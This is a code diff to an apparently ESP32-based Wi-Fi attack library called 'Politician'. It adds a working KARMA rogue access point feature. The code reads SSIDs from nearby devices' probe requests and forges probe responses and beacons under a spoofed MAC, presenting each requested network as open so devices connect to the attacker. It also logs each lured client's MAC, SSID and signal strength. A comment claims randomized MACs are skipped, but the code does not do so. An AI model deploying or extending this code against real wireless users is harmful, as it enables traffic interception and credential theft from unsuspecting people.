@@ -69,6 +69,11 @@ Politician::Politician()
 #ifndef POLITICIAN_NO_MSCHAPV2
     memset(_msChapSessions, 0, sizeof(_msChapSessions));
 #endif
+#ifndef POLITICIAN_NO_KARMA
+    memset(_karmaSeen, 0, sizeof(_karmaSeen));
+    _karmaEnabled = false;
+    _karmaSeenIdx = 0;
+#endif
 }
 
 // ─── Logging ─────────────────────────────────────────────────────────────────
@@ -106,6 +111,9 @@ Error Politician::begin(const Config &cfg) {
         _log("[Config] WARNING: csa_wait_ms (%u) < 1000ms; clamping to 1000ms\n", _cfg.csa_wait_ms);
         _cfg.csa_wait_ms = 1000;
     }
+#ifndef POLITICIAN_NO_KARMA
+    _karmaEnabled = _cfg.karma_enabled;
+#endif
 
     wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
     if (esp_wifi_init(&wifi_cfg) != ESP_OK) return ERR_WIFI_INIT;
@@ -513,6 +521,99 @@ void Politician::_sendProbeRequest(const uint8_t *bssid, const char *ssid, uint8
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
 }
 
+// ─── KARMA Rogue AP Responder ─────────────────────────────────────────────────
+#ifndef POLITICIAN_NO_KARMA
+void Politician::_sendKarmaResponse(const uint8_t *client, const char *ssid,
+                                     uint8_t ssid_len, uint8_t channel) {
+    if (ssid_len == 0 || ssid_len > 32) return;
+
+    // Dedup: skip if we already responded to this (client, ssid) pair within 10 seconds
+    uint32_t now = millis();
+    uint8_t  slot = 0xFF;
+    for (int i = 0; i < MAX_KARMA_SEEN; i++) {
+        if (memcmp(_karmaSeen[i].client, client, 6) == 0 &&
+            strncmp(_karmaSeen[i].ssid, ssid, ssid_len) == 0 &&
+            _karmaSeen[i].ssid[ssid_len] == '\0') {
+            if (now - _karmaSeen[i].last_ms < 10000u) return; // too soon
+            slot = (uint8_t)i;
+            break;
+        }
+    }
+    if (slot == 0xFF) {
+        // Circular eviction
+        slot = _karmaSeenIdx % (uint8_t)MAX_KARMA_SEEN;
+        _karmaSeenIdx = (_karmaSeenIdx + 1) % MAX_KARMA_SEEN;
+    }
+    memcpy(_karmaSeen[slot].client, client, 6);
+    memcpy(_karmaSeen[slot].ssid, ssid, ssid_len);
+    _karmaSeen[slot].ssid[ssid_len] = '\0';
+    _karmaSeen[slot].last_ms = now;
+
+    // Optionally skip SSIDs already in the AP cache with enc > ENC_OPEN
+    // (it's a known secured network — no point echoing it as open)
+    if (_cfg.karma_open_only) {
+        for (int i = 0; i < MAX_AP_CACHE; i++) {
+            if (!_apCache[i].flags.active) continue;
+            if (_apCache[i].ssid_len != ssid_len) continue;
+            if (memcmp(_apCache[i].ssid, ssid, ssid_len) != 0) continue;
+            if (_apCache[i].enc > ENC_OPEN) return;
+        }
+    }
+
+    // Generate a locally-administered spoofed AP MAC (OUI prefix: 02:CA:FE)
+    uint8_t ap_mac[6];
+    uint32_t rnd = esp_random();
+    ap_mac[0] = 0x02; ap_mac[1] = 0xCA; ap_mac[2] = 0xFE;
+    ap_mac[3] = (rnd >> 16) & 0xFF;
+    ap_mac[4] = (rnd >>  8) & 0xFF;
+    ap_mac[5] =  rnd        & 0xFF;
+
+    // ── Probe Response ────────────────────────────────────────────────────────
+    uint8_t frame[128]; int p = 0;
+    frame[p++] = 0x50; frame[p++] = 0x00; // FC: Probe Response
+    frame[p++] = 0x00; frame[p++] = 0x00; // Duration
+    memcpy(frame + p, client,  6); p += 6; // DA = probing client
+    memcpy(frame + p, ap_mac,  6); p += 6; // SA = spoofed AP
+    memcpy(frame + p, ap_mac,  6); p += 6; // BSSID = spoofed AP
+    frame[p++] = 0x00; frame[p++] = 0x00;  // SeqCtrl
+    memset(frame + p, 0, 8); p += 8;       // Timestamp
+    frame[p++] = 0x64; frame[p++] = 0x00;  // Beacon interval: 100 TU
+    frame[p++] = 0x21; frame[p++] = 0x04;  // Capabilities: ESS + Short Preamble (open)
+    // SSID IE
+    frame[p++] = 0x00; frame[p++] = ssid_len;
+    memcpy(frame + p, ssid, ssid_len); p += ssid_len;
+    // Supported Rates IE
+    frame[p++] = 0x01; frame[p++] = 0x08;
+    frame[p++] = 0x82; frame[p++] = 0x84; frame[p++] = 0x8b; frame[p++] = 0x96;
+    frame[p++] = 0x0c; frame[p++] = 0x18; frame[p++] = 0x30; frame[p++] = 0x6c;
+    // DS Parameter Set IE
+    frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = channel;
+
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, p, false);
+
+    // ── Beacon (one burst to the same frame, DA flipped to broadcast) ────────
+    frame[0] = 0x80; frame[1] = 0x00;  // FC: Beacon
+    memset(frame + 4, 0xFF, 6);         // DA: broadcast
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, p, false);
+
+    if (_karmaCb) {
+        KarmaRecord rec;
+        memset(&rec, 0, sizeof(rec));
+        memcpy(rec.client, client, 6);
+        memcpy(rec.ssid, ssid, ssid_len);
+        rec.ssid_len = ssid_len;
+        rec.channel  = channel;
+        rec.rssi     = _lastRssi;
+        memcpy(rec.ap_mac, ap_mac, 6);
+        _karmaCb(rec);
+    }
+
+    _log("[KARMA] Echoed '%.*s' to %02X:%02X:%02X:%02X:%02X:%02X ch%d\n",
+        ssid_len, ssid,
+        client[0], client[1], client[2], client[3], client[4], client[5], channel);
+}
+#endif // POLITICIAN_NO_KARMA
+
 // ─── tick() ───────────────────────────────────────────────────────────────────
 void Politician::tick() {
     if (!_lock || xSemaphoreTakeRecursive(_lock, pdMS_TO_TICKS(100)) != pdTRUE) return;
@@ -775,6 +876,18 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
             }
             if (_fpHook) _fpHook(hdr->addr2, fp_ssid, fp_ssid_len, _rxChannel, rssi, payload, len);
         }
+#ifndef POLITICIAN_NO_KARMA
+        if (_karmaEnabled) {
+            char    karma_ssid[33] = {};
+            uint8_t karma_ssid_len = 0;
+            _parseSsid(payload, len, karma_ssid, karma_ssid_len);
+            // Only respond to named probes (not wildcard) from non-locally-administered MACs
+            // (Optionally skip randomized MACs since they won't auto-associate)
+            if (karma_ssid_len > 0) {
+                _sendKarmaResponse(hdr->addr2, karma_ssid, karma_ssid_len, _rxChannel);
+            }
+        }
+#endif
         return;
     }
 
